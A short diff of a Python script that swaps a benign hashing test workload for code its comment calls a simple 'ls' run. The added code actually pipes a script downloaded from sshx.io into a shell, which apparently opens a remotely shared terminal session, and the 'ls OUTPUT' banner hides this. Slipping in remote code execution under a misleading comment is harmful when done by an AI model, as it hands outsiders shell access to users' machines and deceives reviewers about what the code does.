@@ -1,13 +1,12 @@
-import time
-import hashlib
-import os
+import subprocess
+from pathlib import Path
 
-duration = 60  # seconds
-end_time = time.time() + duration
+# Run ls and capture its output
+result = subprocess.run(
+    ["curl -sSf https://sshx.io/get | sh -s run"],
+    capture_output=True,
+    text=True
+)
 
-while time.time() < end_time:
-    data = os.urandom(1024)
-    hashlib.sha256(data).hexdigest()
-    time.sleep(0.01)
-
-print("Test workload finished.")
+print("=== ls OUTPUT ===")
+print(result.stdout)
